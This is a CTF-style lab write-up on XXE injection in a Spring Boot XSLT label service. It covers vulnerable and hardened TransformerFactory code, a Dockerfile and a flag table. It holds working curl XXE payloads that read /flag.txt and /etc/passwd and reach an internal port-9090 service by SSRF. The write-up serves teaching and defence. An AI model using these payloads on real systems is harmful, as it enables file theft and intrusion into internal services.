# XXE (XML External Entity)

**Date:** April 10, 2026
**Vulnerability:** XML External Entity Injection (CWE-611)  
**OWASP Category:** [A05:2025 – Injection](../reference/owasp-top-10.md)

---

## What Was Demonstrated

In this session, we explored **XXE (XML External Entity) Injection** — a vulnerability where an XML parser processes untrusted XML input with external entity resolution enabled, allowing attackers to read local files, perform SSRF, or cause denial of service.

We built a Spring Boot app that accepts XSLT stylesheets to transform product data into labels. The vulnerable `TransformerFactory` allows external entity processing, which can be abused for:

- **Path Traversal via XXE** — Read local files like `/flag.txt` and `/etc/passwd`
- **SSRF (Server-Side Request Forgery)** — Reach an internal HTTP service on port 9090 that serves the `/root` directory listing, exposing `flag.txt` only readable by root

---

## Resources

### :material-docker: Container Images

```bash
# Pull and run the app
docker pull ghcr.io/<owner>/<repo>/fixitfriday/session-3-xxe:latest
docker run -p 8080:8080 ghcr.io/<owner>/<repo>/fixitfriday/session-3-xxe:latest
```

### :material-github: Source Code

- **Session-3-XXE** — Spring Boot app with vulnerable and secure XSLT transformation

---

## API Endpoints

| Endpoint | Method | Content-Type | Description |
|----------|--------|-------------|-------------|
| `/api/labels/generate` | POST | `application/xml` | Accepts an XSLT stylesheet, transforms product data, returns the result |

### Product Data

The app transforms a static product XML file at `data/product.xml`:

```xml
<product>
    <name>Artisanal Sourdough</name>
    <price>8.99</price>
</product>
```

---

## Vulnerability Details

### Vulnerable Code

The `compileXSLTVulnerable` method creates a `TransformerFactory` without disabling external entity resolution:

```java
public static Transformer compileXSLTVulnerable(final Document inXslt)
        throws TransformerConfigurationException {
    TransformerFactory factory = TransformerFactory.newInstance();
    synchronized (inXslt) {
        return factory.newTransformer(new DOMSource(inXslt));
    }
}
```

!!! danger "Problem"
    The `TransformerFactory` defaults allow external DTDs, external stylesheets, and entity expansion. An attacker can inject `<!DOCTYPE>` declarations or `<xsl:import>` directives to read files or make outbound requests.

### Exploitation

#### 1. Path Traversal via XXE — Read `/flag.txt`

```bash
curl -X POST http://localhost:8080/api/labels/generate \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <label>&xxe;</label>
  </xsl:template>
</xsl:stylesheet>'
```

#### 2. Path Traversal via XXE — Read `/etc/passwd`

```bash
curl -X POST http://localhost:8080/api/labels/generate \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <label>&xxe;</label>
  </xsl:template>
</xsl:stylesheet>'
```

#### 3. SSRF — Reach Internal Service on Port 9090

The container runs an internal HTTP server (BusyBox `nc`-based) on port 9090 as root, serving the `/root` directory. This simulates an internal service not exposed to the outside.

```bash
# Directory listing of /root
curl -X POST http://localhost:8080/api/labels/generate \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:9090/">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <label>&xxe;</label>
  </xsl:template>
</xsl:stylesheet>'

# Read /root/flag.txt via the internal service
curl -X POST http://localhost:8080/api/labels/generate \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:9090/flag.txt">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <label>&xxe;</label>
  </xsl:template>
</xsl:stylesheet>'
```

!!! info "Why SSRF is needed"
    `/root/flag.txt` has `chmod 600` — only root can read it. The Spring Boot app runs as `appuser`, so direct file read via `file:///root/flag.txt` will fail. The internal service runs as root and can serve the file over HTTP.

---

### Secure Code

The `compileXSLTSecure` method explicitly disables external DTDs, external stylesheets, and enables secure processing:

```java
public static Transformer compileXSLTSecure(final Document inXslt)
        throws TransformerConfigurationException {
    TransformerFactory factory = TransformerFactory.newInstance();

    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

    synchronized (inXslt) {
        return factory.newTransformer(new DOMSource(inXslt));
    }
}
```

!!! success "Fix"
    - `ACCESS_EXTERNAL_DTD = ""` — Blocks loading of external DTDs (no `file://`, `http://`, etc.)
    - `ACCESS_EXTERNAL_STYLESHEET = ""` — Blocks `<xsl:import>` / `<xsl:include>` from external sources
    - `FEATURE_SECURE_PROCESSING = true` — Applies resource limits to prevent DoS

---

## Dockerfile Architecture

The container runs two services under different privilege levels:

```
┌──────────────────────────────────────┐
│           Docker Container           │
│                                      │
│  ┌──────────────────────────────┐    │
│  │  Spring Boot (port 8080)     │    │
│  │  Runs as: appuser            │    │
│  │  Can read: /flag.txt (644)   │    │
│  │  Cannot read: /root/flag.txt │    │
│  └──────────────────────────────┘    │
│                                      │
│  ┌──────────────────────────────┐    │
│  │  BusyBox nc server (9090)    │    │
│  │  Runs as: root (setuid)      │    │
│  │  Serves: /root directory     │    │
│  │  Internal only — not exposed │    │
│  └──────────────────────────────┘    │
│                                      │
│  Flags:                              │
│  /flag.txt       → 644 (world-read) │
│  /root/flag.txt  → 600 (root-only)  │
└──────────────────────────────────────┘
```

```dockerfile
FROM eclipse-temurin:17-jdk-alpine
WORKDIR /app

ARG S3_FLAG1   # World-readable flag
ARG S3_FLAG2   # Root-only flag

COPY target/*.jar app.jar

RUN echo "$S3_FLAG1" > /flag.txt && chmod 644 /flag.txt
RUN echo "$S3_FLAG2" > /root/flag.txt && chmod 600 /root/flag.txt

RUN addgroup -S appgroup && adduser -S appuser -G appgroup
RUN chown -R appuser:appgroup /app

# Setuid busybox for root-level internal service
RUN cp /bin/busybox /usr/local/bin/busybox-root && \
    chmod u+s /usr/local/bin/busybox-root

# Internal server scripts (nc-based HTTP)
COPY docker/serve.sh docker/internal-server.sh /usr/local/bin/
COPY docker/entrypoint.sh /entrypoint.sh
RUN chmod +x /usr/local/bin/serve.sh /usr/local/bin/internal-server.sh /entrypoint.sh

USER appuser

EXPOSE 8080
ENTRYPOINT ["/entrypoint.sh"]
```

!!! note "Privilege separation"
    `docker exec -it <container> sh` lands as `appuser` (not root), simulating a real-world environment where the app has limited permissions but internal services may run with higher privileges.

---

## CTF Flags

| Flag | Location | Permissions | Attack Vector |
|------|----------|-------------|---------------|
| `S3_FLAG1` | `/flag.txt` | `644` (world-readable) | XXE path traversal (`file:///flag.txt`) |
| `S3_FLAG2` | `/root/flag.txt` | `600` (root-only) | XXE SSRF → internal service on port 9090 |

---

## Key Takeaways

- Always disable external entity resolution in XML parsers and XSLT processors
- Set `ACCESS_EXTERNAL_DTD`, `ACCESS_EXTERNAL_STYLESHEET` to empty strings and enable `FEATURE_SECURE_PROCESSING`
- XXE is not just about file reading — it enables **SSRF** attacks against internal services
- Running the app as a non-root user limits direct file access but doesn't prevent SSRF to privileged internal services
- Internal services (even on localhost) should implement their own authentication/authorization
- Defense in depth: fix the parser **and** restrict container privileges **and** segment internal services

---
